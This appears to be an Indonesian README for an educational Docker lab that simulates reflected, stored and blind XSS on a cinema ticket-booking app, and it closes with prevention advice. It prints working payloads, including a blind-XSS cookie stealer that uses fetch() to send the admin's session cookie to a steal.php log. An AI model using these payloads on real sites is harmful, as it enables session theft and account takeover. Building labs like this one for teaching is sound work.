# Simulasi Kerentanan XSS - CinemaX Ticket Booking

Proyek ini adalah simulasi kerentanan **Cross-Site Scripting (XSS)** yang mencakup 3 jenis: **Reflected**, **Stored**, dan **Blind XSS**. Simulasi ini dilakukan pada aplikasi pemesanan tiket bioskop modern.

## 🚀 Persiapan dengan Docker (Direkomendasikan)
Gunakan Docker untuk menjalankan simulasi dengan cepat:
1. Masuk ke folder proyek:
   ```bash
   cd XSS
   ```
2. Jalankan Docker Compose:
   ```bash
   docker-compose up -d
   ```
3. Akses aplikasi:
   - **Frontend (Korban)**: `http://localhost:8001`
   - **Admin (Target Blind XSS)**: `http://localhost:8001/admin_login.php` (User: `admin`, Pass: `admin123`)
   - **Attacker Log (Hasil Curian)**: `http://localhost:8001/steal.php?view=1`

---

## 👥 Skenario Simulasi Serangan

### 1. Reflected XSS (Pencurian Session via Link)
- **Target**: User yang mengklik link berbahaya.
- **Payload**: `<script>alert('Reflected XSS: ' + document.domain)</script>`
- **Cara**: Masukkan payload di kotak pencarian atau akses:
  `http://localhost:8001/search.php?q=<script>alert(document.cookie)</script>`
- **Analogi**: Attacker mengirim email berisi link tersebut kepada victim. Saat diklik, script berjalan di browser victim.

### 2. Stored XSS (Halaman Utama)
- **Target**: Semua user yang melihat halaman review.
- **Cara**: 
  1. Masuk ke halaman utama.
  2. Isi form ulasan dengan payload: `<script>alert('Stored XSS!')</script>`.
  3. Setiap kali user lain (victim) membuka halaman utama, alert akan muncul.

### 3. Blind XSS + Cookie Stealer (Pengambilalihan Akun Admin)
Ini adalah skenario paling berbahaya dalam simulasi ini.
- **Target**: Admin Bioskop.
- **Payload**:
  ```html
  <script>
  fetch('http://localhost:8001/steal.php?cookies=' + btoa(document.cookie));
  </script>
  ```
- **Langkah Serangan**:
  1. Penyerang (Attacker) memasukkan payload di atas ke form **Ulasan** di halaman depan.
  2. Tunggu Admin login ke dashboard (`/admin_login.php`) untuk memeriksa ulasan.
  3. Saat Admin membuka dashboard, script dieksekusi di browser Admin.
  4. Script mengirimkan cookie session Admin ke `steal.php`.
  5. Attacker memeriksa hasil curian di: `http://localhost:8001/steal.php?view=1`.

---

## 🛡️ Cara Mencegah XSS
1. **Output Encoding**: Gunakan `htmlspecialchars()` di PHP setiap kali mencetak variabel ke HTML.
2. **Content Security Policy (CSP)**: Terapkan header CSP untuk membatasi eksekusi inline script.
3. **HTTPOnly Cookie**: Setel flag `HttpOnly` pada cookie session agar tidak bisa diakses via JavaScript (`document.cookie`).

---
**⚠️ Peringatan:** Hanya untuk tujuan edukasi. Jangan gunakan pada sistem nyata tanpa izin!
